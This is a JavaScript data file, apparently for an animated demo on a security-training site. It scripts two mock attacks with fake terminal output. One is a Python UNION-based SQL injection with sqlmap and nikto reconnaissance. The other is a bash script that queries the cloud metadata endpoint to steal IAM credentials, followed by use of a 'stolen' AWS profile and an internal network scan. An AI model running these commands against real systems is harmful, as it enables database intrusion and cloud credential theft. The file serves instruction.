export const attacks = [
    {
        url: "bugora.app/lessons/advanced-sql-discovery",
        fileName: "exploit.py",
        fileExt: "python",
        keystrokes: "import requests\n\ntarget = \"http://api.target.com\"\npayload = \"' UNION SELECT user(),db()--\"\n\nr = requests.get(f\"{target}/users?id={payload}\")\nprint(r.json())",
        tokens: [
            { text: "import", type: "keyword" },
            { text: " requests\n\n", type: "plain" },
            { text: "target", type: "variable" },
            { text: " = ", type: "operator" },
            { text: "\"http://api.target.com\"", type: "string" },
            { text: "\n", type: "plain" },
            { text: "payload", type: "variable" },
            { text: " = ", type: "operator" },
            { text: "\"' UNION SELECT user(),db()--\"", type: "string" },
            { text: "\n\n", type: "plain" },
            { text: "r", type: "variable" },
            { text: " = requests.", type: "plain" },
            { text: "get", type: "method" },
            { text: "(", type: "plain" },
            { text: "f\"{target}/users?id={payload}\"", type: "string" },
            { text: ")\n", type: "plain" },
            { text: "print", type: "keyword" },
            { text: "(r.json())", type: "plain" }
        ],
        terminal: [
            { text: "[*] Connecting to api.target.com...", type: "info", delay: 0.5 },
            { text: "[+] Connection OK. Latency: 42ms", type: "success", delay: 1.5 },
            { text: "[*] Injecting UNION payload on /users?id=", type: "info", delay: 3.0 },
            { text: "[!] HTTP 500 — error on 'id' param", type: "info", delay: 4.5 },
            { text: "[+] Injectable: UNION SELECT user(),db()--", type: "success", delay: 6.0 },
            { text: "[+] Extracted: root@localhost | vault_prod", type: "success", delay: 7.5 },
            { text: "[+] 4 tables: users, sessions, api_keys, logs", type: "success", delay: 9.0 }
        ],
        summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
    },
    {
        url: "bugora.app/lessons/ssrf-iam-pillage",
        fileName: "ssrf.sh",
        fileExt: "sh",
        keystrokes: "#!/bin/bash\n\nMETA=\"http://169.254.169.254\"\nROLE=$(curl -s $META/latest/iam/)\n\nCREDS=$(curl -s $META/iam/$ROLE)\necho $CREDS | jq '.AccessKeyId'",
        tokens: [
            { text: "#!/bin/bash", type: "comment" },
            { text: "\n\n", type: "plain" },
            { text: "META", type: "variable" },
            { text: "=", type: "operator" },
            { text: "\"http://169.254.169.254\"", type: "string" },
            { text: "\n", type: "plain" },
            { text: "ROLE", type: "variable" },
            { text: "=", type: "operator" },
            { text: "$(", type: "plain" },
            { text: "curl", type: "method" },
            { text: " -s $META/latest/iam/)\n\n", type: "plain" },
            { text: "CREDS", type: "variable" },
            { text: "=", type: "operator" },
            { text: "$(", type: "plain" },
            { text: "curl", type: "method" },
            { text: " -s $META/iam/$ROLE)\n", type: "plain" },
            { text: "echo", type: "keyword" },
            { text: " $CREDS | ", type: "plain" },
            { text: "jq", type: "method" },
            { text: " '.AccessKeyId'", type: "string" }
        ],
        terminal: [
            { text: "[*] Probing metadata endpoint...", type: "info", delay: 0.8 },
            { text: "[+] Tunnel established at 10.0.42.12", type: "success", delay: 1.8 },
            { text: "[*] Found role: web-app-production-role", type: "info", delay: 3.0 },
            { text: "[!] Credentials found for production-role!", type: "success", delay: 4.5 },
            { text: "[+] AccessKeyId: ASIA... | Secret: [REDACTED]", type: "success", delay: 6.0 },
            { text: "[+] Token: FwoGZXIvYXdz... (3600s)", type: "success", delay: 7.5 },
            { text: "[+] s3://prod-backups | s3://config-vault", type: "success", delay: 9.0 }
        ],
        summary: "SSRF exploit bypassed proxy to exfiltrate IAM credentials. Session hijack completed."
    }
];

export const cmdSets = [
    // Attack 0: SQLi — recon + exploitation workflow
    [
        {
            cmd: "nmap -sV -p 80,443 api.target.com", dir: "~", output: [
                { text: "Starting Nmap 7.94 ( https://nmap.org )", type: "info" },
                { text: "PORT   STATE SERVICE VERSION", type: "info" },
                { text: "80/tcp open  http    Apache/2.4.52", type: "success" },
                { text: "443/tcp open ssl/http nginx 1.18.0", type: "success" },
            ]
        },
        {
            cmd: "nikto -h api.target.com -Tuning 9", dir: "~", output: [
                { text: "+ Target IP:   203.0.113.42", type: "info" },
                { text: "+ OSVDB-3092: /users?id=: Parameter 'id' injectable", type: "success" },
            ]
        },
        {
            cmd: "sqlmap -u \"api.target.com/users?id=1\" --dbs", dir: "~", output: [
                { text: "[*] testing connection to the target URL", type: "info" },
                { text: "[!] parameter 'id' is vulnerable. Type: UNION query", type: "success" },
                { text: "[+] available databases: vault_prod, information_schema", type: "success" },
            ]
        },
        { cmd: "python3 exploit.py", dir: "~/labs", output: [] }
    ],
    // Attack 1: SSRF — cloud recon + IAM workflow
    [
        {
            cmd: "curl -s http://169.254.169.254/latest/meta-data/", dir: "~", output: [
                { text: "ami-id\ninstance-type\niam/", type: "info" },
            ]
        },
        {
            cmd: "aws sts get-caller-identity --profile stolen", dir: "~", output: [
                { text: '{ "Account": "314159265358", "Arn": "arn:aws:iam::role/web-app-prod" }', type: "success" },
            ]
        },
        {
            cmd: "nmap -sn 10.0.0.0/24 --open", dir: "~", output: [
                { text: "Nmap scan report for 10.0.0.12 (svc.internal-proxy)", type: "info" },
                { text: "Host is up (0.0023s latency). 3 hosts discovered.", type: "success" },
            ]
        },
        { cmd: "bash ssrf.sh", dir: "~/labs", output: [] }
    ]
];
